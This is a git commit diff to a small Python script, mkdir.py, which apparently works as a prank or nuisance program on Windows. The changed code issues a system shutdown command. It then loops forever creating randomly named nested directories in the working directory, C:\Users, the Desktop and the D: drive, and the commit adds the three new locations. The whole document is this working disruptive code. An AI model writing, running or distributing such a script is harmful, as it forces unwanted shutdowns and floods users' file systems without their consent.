f9e81c7c46acda165a636c21157690c79c3d0aa8
babakkhezry <babak.khezri7@gmail.com>
2020-02-28 11:52:09 +0330

    Make directory in 3 more addresses

--- mkdir.py
+++ mkdir.py
@@ -5,11 +5,13 @@ def Desktop():
     username = getuser()
     addres = "C:\\Users\\" + username + "\\Desktop" 
     return addres
-addres = Desktop()
-chdir(addres)
+addres_1 = getcwd()
+addres_2 = "C:\\Users"
+addres_3 = Desktop()
+addres_4 = "D:\\"
 name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 le = len(name) - 1
-system("shutdown/r")
+system("shutdown/s")
 while True:
     rand_1 = randint(0,le)
     rand_2 = randint(0,le)
@@ -20,5 +22,11 @@ while True:
     rand_7 = randint(0,le)
     rand_8 = randint(0,le)
     direcory = name[rand_1] + name[rand_2] + name[rand_3] + name[rand_4] + name[rand_5] + name[rand_6] + name[rand_7] + name[rand_8]
-    system("cd ..")
+    chdir(addres_1)
+    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    chdir(addres_2)
+    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    chdir(addres_3)
+    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    chdir(addres_4)
     system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
